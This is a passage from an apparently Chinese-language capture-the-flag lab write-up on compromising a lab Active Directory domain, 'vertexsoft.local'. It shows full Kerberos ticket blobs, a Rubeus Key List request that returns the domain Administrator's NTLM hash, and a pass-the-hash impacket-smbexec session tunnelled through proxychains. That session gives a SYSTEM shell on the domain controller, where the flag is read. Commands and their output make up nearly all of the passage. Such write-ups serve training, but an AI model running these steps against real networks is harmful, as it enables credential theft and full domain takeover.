      doIFpjCCBaKgAwIBBaEDAgEWooIElzCCBJNhggSPMIIEi6ADAgEFoRIbEFZFUlRFWFNPRlQuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEHZlcnRleHNvZnQubG9jYWyjggRHMIIEQ6ADAgEXoQYCBBA8AACiggQyBIIELqC39oxbRGhg1JhAIzge+YaHCHWYQYLFZQPDnkmY3j0W2v/x4WdoQ9mZLS9z9NoQx/K7m581jJD8jIhZ4rAEjzfwkJUv6lIbyxHO570JqgZ3my69t/3ffalE0H+AYCwQbj0X0y/UnzRIL2U4vJDxIWKlczb0EOplR9w6TxJ1Y907V4VLFL9rlLRS6cP9jCdEf/Kbi+vtj5Ys6qwQvlLLumBQLfhV8xjWz/lORAxODCCEujRs8DmPyIR8f5NFPCg/GD13kGW4WiOH5r5D7g8GAOt5DCTUKyqRrsZAGziVHH0ZnqpfHqN4OXhakU8qRtIaNL6kEhgN7kzt/+y29XTFn1aFu1qfSWgBPpyPyTTRyR3+POuffMbHm35LwTr0dCUc3a25HZTI2YHnwHCSm3ZJgO8lTAxv50zeOFKznEoBxFFKMwhUHrCqbORJlQ6ils410CllmIKOBpAktHbspmgbU10hPEZ6XnMpWxReVJc1ynpxqUsnI6yvVK8aB02cabvVnvUFzCCbKw1d0lSWm43+rGOSVT4jarKhx06qJ5jV2m4xUzOgwRooVxjPmrR9fLwISh3u2ZGwiIPl6yIegE2A6HDW9wp1lNgVXreql0vz9KZo29acrd9VGXGujV+friOO7WqngCyxoKMJFq+erAYCwVpqf8QFkKyPZcTOAgNqT6mixa57wi73L6hzHXloHs3NJwTiXiaHcYHSdVhfjDmE0UGjSFGRVIWxX6f7Zphl11Pdy5lpo/jzBouzk//V+KTXHZQ9vsdTbh+FYMaRNRgsczfKMNcjNrGU4vqZWgB76C9O/7s0PddHi1jc1MeROP5LIgcio3hZ0orFi+aeRbk/hH84Kwc/PykeXDYZ4oi7tOXYhkFBqKU/ulwdXcbTzWGdv9ZzqUJFsiHws1/Wukp/AKoMBDTRmkXoj39Ob/zkuFk/wWD1pyASLmHHA4A5EUb5a0EkmytBRBWZOlUgAszVrVUAnrY4kIkoU/4NYk2Vll6QG3pDZwNBto52tgSF9o0UlFkDc4Nf0TKeTv2mPyOHIUMEYGhC97VLrXdPotdI5nJmiAV4huOD2cCXPMGq0wVrQjprqZuKfXmLGGTq0SIfBHFJJN6dI50vQtNyW83pN4AOWeTGrSUm+zq9twkm2MWpRE1sXtsTQ8wNJh3EaxDqL2c3u+gCFQWiz7OkASUYYppTHadF7I1asnHbsCLJ/gZFAbkDUzkfTsejer2mmWC/LDimpapd9upIsnJnlyA4IZJfUjVvBNCqJL6eZR0rrIKy99ZYTPQxtpW+qkByylDlxOIAEMhvo8ZH2UsYGrYFUEYFiw7eTCEHhTrhHlzfUCnRh+XnflRsC5N/LWMDwJLZPblLrNJKPVV9vkxR3vJ6YymeEXNWtav608k/Lbipk1zJYqOdtyQCZAPp3Xt4Sy1Vo4H6MIH3oAMCAQCige8Egex9gekwgeaggeMwgeAwgd2gGzAZoAMCARehEgQQP4C1KQBNnBbeKEi2X4Rf86ESGxBWRVJURVhTT0ZULkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDkwODEwMjczNlqlERgPMjAyNjA5MDgxMDI3MzZaphEYDzIwMjYwOTA4MjAyNzM2WqcRGA8yMDI2MDkxNTEwMjczNlqoEhsQVkVSVEVYU09GVC5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQdmVydGV4c29mdC5sb2NhbA==
```

抓到hash
```
PS C:\> ./Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/vertexsoft.local /dc:DC.vertexsoft.local /ticket:doIFpjCCBaKgAwIBBaEDAgEWooIElzCCBJNhggSPMIIEi6ADAgEFoRIbEFZFUlRFWFNPRlQuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEHZlcnRleHNvZnQubG9jYWyjggRHMIIEQ6ADAgEXoQYCBBA8AACiggQyBIIELqC39oxbRGhg1JhAIzge+YaHCHWYQYLFZQPDnkmY3j0W2v/x4WdoQ9mZLS9z9NoQx/K7m581jJD8jIhZ4rAEjzfwkJUv6lIbyxHO570JqgZ3my69t/3ffalE0H+AYCwQbj0X0y/UnzRIL2U4vJDxIWKlczb0EOplR9w6TxJ1Y907V4VLFL9rlLRS6cP9jCdEf/Kbi+vtj5Ys6qwQvlLLumBQLfhV8xjWz/lORAxODCCEujRs8DmPyIR8f5NFPCg/GD13kGW4WiOH5r5D7g8GAOt5DCTUKyqRrsZAGziVHH0ZnqpfHqN4OXhakU8qRtIaNL6kEhgN7kzt/+y29XTFn1aFu1qfSWgBPpyPyTTRyR3+POuffMbHm35LwTr0dCUc3a25HZTI2YHnwHCSm3ZJgO8lTAxv50zeOFKznEoBxFFKMwhUHrCqbORJlQ6ils410CllmIKOBpAktHbspmgbU10hPEZ6XnMpWxReVJc1ynpxqUsnI6yvVK8aB02cabvVnvUFzCCbKw1d0lSWm43+rGOSVT4jarKhx06qJ5jV2m4xUzOgwRooVxjPmrR9fLwISh3u2ZGwiIPl6yIegE2A6HDW9wp1lNgVXreql0vz9KZo29acrd9VGXGujV+friOO7WqngCyxoKMJFq+erAYCwVpqf8QFkKyPZcTOAgNqT6mixa57wi73L6hzHXloHs3NJwTiXiaHcYHSdVhfjDmE0UGjSFGRVIWxX6f7Zphl11Pdy5lpo/jzBouzk//V+KTXHZQ9vsdTbh+FYMaRNRgsczfKMNcjNrGU4vqZWgB76C9O/7s0PddHi1jc1MeROP5LIgcio3hZ0orFi+aeRbk/hH84Kwc/PykeXDYZ4oi7tOXYhkFBqKU/ulwdXcbTzWGdv9ZzqUJFsiHws1/Wukp/AKoMBDTRmkXoj39Ob/zkuFk/wWD1pyASLmHHA4A5EUb5a0EkmytBRBWZOlUgAszVrVUAnrY4kIkoU/4NYk2Vll6QG3pDZwNBto52tgSF9o0UlFkDc4Nf0TKeTv2mPyOHIUMEYGhC97VLrXdPotdI5nJmiAV4huOD2cCXPMGq0wVrQjprqZuKfXmLGGTq0SIfBHFJJN6dI50vQtNyW83pN4AOWeTGrSUm+zq9twkm2MWpRE1sXtsTQ8wNJh3EaxDqL2c3u+gCFQWiz7OkASUYYppTHadF7I1asnHbsCLJ/gZFAbkDUzkfTsejer2mmWC/LDimpapd9upIsnJnlyA4IZJfUjVvBNCqJL6eZR0rrIKy99ZYTPQxtpW+qkByylDlxOIAEMhvo8ZH2UsYGrYFUEYFiw7eTCEHhTrhHlzfUCnRh+XnflRsC5N/LWMDwJLZPblLrNJKPVV9vkxR3vJ6YymeEXNWtav608k/Lbipk1zJYqOdtyQCZAPp3Xt4Sy1Vo4H6MIH3oAMCAQCige8Egex9gekwgeaggeMwgeAwgd2gGzAZoAMCARehEgQQP4C1KQBNnBbeKEi2X4Rf86ESGxBWRVJURVhTT0ZULkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDkwODEwMjczNlqlERgPMjAyNjA5MDgxMDI3MzZaphEYDzIwMjYwOTA4MjAyNzM2WqcRGA8yMDI2MDkxNTEwMjczNlqoEhsQVkVSVEVYU09GVC5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQdmVydGV4c29mdC5sb2NhbA==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGS

[*] Requesting 'rc4_hmac' etype for the service ticket
[*] Building KeyList TGS-REQ request for: 'Administrator'
[*] Using domain controller: DC.vertexsoft.local (192.168.1.11)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/VERTEXSOFT.LOCAL
  ServiceRealm             :  VERTEXSOFT.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  VERTEXSOFT.LOCAL
  StartTime                :  9/8/2026 6:28:35 PM
  EndTime                  :  9/9/2026 4:27:36 AM
  RenewTill                :  1/1/0001 8:00:00 AM
  Flags                    :  name_canonicalize, pre_authent
  KeyType                  :  rc4_hmac
  Base64(key)              :  WXinEFs804YXTuLkuufxRg==
  Password Hash            :  EBC447441306783742EE3DF769051B75


PS C:\>
```

hash传递上去拿flag
```powershell
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc impacket-smbexec -hashes :EBC447441306783742EE3DF769051B75 vertexsoft.local/administrator@192.168.1.11 -codec gbk
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  211.159.175.21:10001  ...  192.168.1.11:445  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7ae8:cf5c:8333:aecd%6
   IPv4 Address. . . . . . . . . . . : 192.168.1.11
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.253

C:\Windows\system32>type C:\Users\administrator\flag\*.txt

C:\Users\administrator\flag\flag.txt


flag{81c860d4-5da1-40d6-bdba-33dc58b3c035}
```